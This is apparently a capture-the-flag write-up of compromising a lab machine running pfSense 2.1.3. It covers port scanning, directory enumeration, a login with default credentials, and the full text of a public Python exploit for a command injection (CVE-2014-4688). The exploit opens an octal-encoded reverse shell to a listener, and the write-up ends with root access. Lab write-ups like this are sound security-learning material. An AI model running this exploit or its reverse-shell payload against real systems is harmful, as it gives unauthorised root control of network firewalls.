![image](https://user-images.githubusercontent.com/105310322/187970393-d8d1c7dd-5c59-4456-959f-26eaae4959ec.png)

### Tools: nmap, gobuster, python

### Vulnerabilities: default passwords, pfsense

Nmap only gives us 2 ports back for a webpage.

```console
└──╼ [★]$ sudo nmap -p- -sS -sV -sC 10.129.51.37
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-31 21:28 BST
Nmap scan report for 10.129.51.37
Host is up (0.040s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT    STATE SERVICE    VERSION
80/tcp  open  http       lighttpd 1.4.35
|_http-title: Did not follow redirect to https://10.129.51.37/
|_http-server-header: lighttpd/1.4.35
443/tcp open  ssl/https?
| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US
| Not valid before: 2017-10-14T19:21:35
|_Not valid after:  2023-04-06T19:21:35
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 489.21 seconds
```

The webpage only gives us a login and defualt credentials were not working.

![image](https://user-images.githubusercontent.com/105310322/187794337-bce51ecb-0381-4193-b554-10bd82bed112.png)

Running gobuster gave me alot of errors but adding the -k instantly made it owrk revealing alot of files and directories. For extensions we can at least tell its php based on the index.php on the main page. Add in txt and html to see if there is anything else hiding.

I looked at most of these files but the one that stands out is ```/system-users.txt```

```console
└──╼ [★]$ gobuster dir -u https://10.129.51.37/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x php,txt,html
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.129.51.37/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
2022/08/31 23:24:17 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 6690]
/index.html           (Status: 200) [Size: 329] 
/help.php             (Status: 200) [Size: 6689]
/themes               (Status: 301) [Size: 0] [--> https://10.129.51.37/themes/]
/stats.php            (Status: 200) [Size: 6690]                                
/css                  (Status: 301) [Size: 0] [--> https://10.129.51.37/css/]   
/edit.php             (Status: 200) [Size: 6689]                                
/includes             (Status: 301) [Size: 0] [--> https://10.129.51.37/includes/]
/license.php          (Status: 200) [Size: 6692]                                  
/system.php           (Status: 200) [Size: 6691]                                  
/status.php           (Status: 200) [Size: 6691]                                  
/javascript           (Status: 301) [Size: 0] [--> https://10.129.51.37/javascript/]
/changelog.txt        (Status: 200) [Size: 271]                                     
/classes              (Status: 301) [Size: 0] [--> https://10.129.51.37/classes/]   
/exec.php             (Status: 200) [Size: 6689]                                    
/widgets              (Status: 301) [Size: 0] [--> https://10.129.51.37/widgets/]   
/graph.php            (Status: 200) [Size: 6690]                                    
/tree                 (Status: 301) [Size: 0] [--> https://10.129.51.37/tree/]      
/wizard.php           (Status: 200) [Size: 6691]                                    
/shortcuts            (Status: 301) [Size: 0] [--> https://10.129.51.37/shortcuts/] 
/pkg.php              (Status: 200) [Size: 6688]                                    
/installer            (Status: 301) [Size: 0] [--> https://10.129.51.37/installer/] 
/wizards              (Status: 301) [Size: 0] [--> https://10.129.51.37/wizards/]   
/xmlrpc.php           (Status: 200) [Size: 384]                                     
/reboot.php           (Status: 200) [Size: 6691]                                    
/interfaces.php       (Status: 200) [Size: 6695]                                    
/csrf                 (Status: 301) [Size: 0] [--> https://10.129.51.37/csrf/]      
/system-users.txt     (Status: 200) [Size: 106]                                     
/filebrowser          (Status: 301) [Size: 0] [--> https://10.129.51.37/filebrowser/]
/%7Echeckout%7E       (Status: 403) [Size: 345]                                      
                                                                                     
===============================================================
2022/08/31 23:40:41 Finished
===============================================================
```
This file reveals a user ```rohit``` and suggests that it is using a default password.


![image](https://user-images.githubusercontent.com/105310322/187796644-fe1e91c7-0ad6-42aa-9c39-81f48935d52e.png)

Login with user ```rohit``` and the default password for pfsense is ```pfsense```

Awesome we are in and we can see the version number for the pfsense is 2.1.3 so lets find an exploit for this.

![image](https://user-images.githubusercontent.com/105310322/187797528-2117d116-9224-4e45-9240-0e583756b6d3.png)

This exploit was found here https://www.exploit-db.com/exploits/43560

This exploit only works if there is ```status_rrd_graph_img.php``` and we can confirm that by going to the webpage.

```python
#!/usr/bin/env python3

# Exploit Title: pfSense <= 2.1.3 status_rrd_graph_img.php Command Injection.
# Date: 2018-01-12
# Exploit Author: absolomb
# Vendor Homepage: https://www.pfsense.org/
# Software Link: https://atxfiles.pfsense.org/mirror/downloads/old/
# Version: <=2.1.3
# Tested on: FreeBSD 8.3-RELEASE-p16
# CVE : CVE-2014-4688

import argparse
import requests
import urllib
import urllib3
import collections

'''
pfSense <= 2.1.3 status_rrd_graph_img.php Command Injection.
This script will return a reverse shell on specified listener address and port.
Ensure you have started a listener to catch the shell before running!
'''

parser = argparse.ArgumentParser()
parser.add_argument("--rhost", help = "Remote Host")
parser.add_argument('--lhost', help = 'Local Host listener')
parser.add_argument('--lport', help = 'Local Port listener')
parser.add_argument("--username", help = "pfsense Username")
parser.add_argument("--password", help = "pfsense Password")
args = parser.parse_args()

rhost = args.rhost
lhost = args.lhost
lport = args.lport
username = args.username
password = args.password


# command to be converted into octal
command = """
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("%s",%s));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
""" % (lhost, lport)


payload = ""

# encode payload in octal
for char in command:
	payload += ("\\" + oct(ord(char)).lstrip("0o"))

login_url = 'https://' + rhost + '/index.php'
exploit_url = "https://" + rhost + "/status_rrd_graph_img.php?database=queues;"+"printf+" + "'" + payload + "'|sh"

headers = [
	('User-Agent','Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0'),
	('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
	('Accept-Language', 'en-US,en;q=0.5'),
	('Referer',login_url),
	('Connection', 'close'),
	('Upgrade-Insecure-Requests', '1'),
	('Content-Type', 'application/x-www-form-urlencoded')
]

# probably not necessary but did it anyways
headers = collections.OrderedDict(headers)

# Disable insecure https connection warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

client = requests.session()

# try to get the login page and grab the csrf token
try:
	login_page = client.get(login_url, verify=False)

	index = login_page.text.find("csrfMagicToken")
	csrf_token = login_page.text[index:index+128].split('"')[-1]

except:
	print("Could not connect to host!")
	exit()

# format login variables and data
if csrf_token:
	print("CSRF token obtained")
	login_data = [('__csrf_magic',csrf_token), ('usernamefld',username), ('passwordfld',password), ('login','Login') ]
	login_data = collections.OrderedDict(login_data)
	encoded_data = urllib.parse.urlencode(login_data)

# POST login request with data, cookies and header
	login_request = client.post(login_url, data=encoded_data, cookies=client.cookies, headers=headers)
else:
	print("No CSRF token!")
	exit()

if login_request.status_code == 200:
		print("Running exploit...")
# make GET request to vulnerable url with payload. Probably a better way to do this but if the request times out then most likely you have caught the shell
		try:
			exploit_request = client.get(exploit_url, cookies=client.cookies, headers=headers, timeout=5)
			if exploit_request.status_code:
				print("Error running exploit")
		except:
			print("Exploit completed")
            
```

After downloading we set up our listener and then run it with the following arguments.

```console
└──╼ [★]$ python3 sense.py --rhost 10.129.215.40 --lhost 10.10.14.41 --lport 1234 --username rohit --password pfsense
CSRF token obtained
Running exploit...
Exploit completed
```
Nice it hangs and we get a shell!

```console
└──╼ [★]$ nc -lnvp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.129.215.40.
Ncat: Connection from 10.129.215.40:21244.
sh: can't access tty; job control turned off
# id
uid=0(root) gid=0(wheel) groups=0(wheel)
# 
```
And both flags super quick!

```console
# cat user.txt
8721****************************
#
```
```console
# cat root.txt	
d08c****************************
# 
```

This was my first FreeBSD box and it was very simple. So far it doesnt seem much diffrent from a regular linux box running a webpage.

GG!
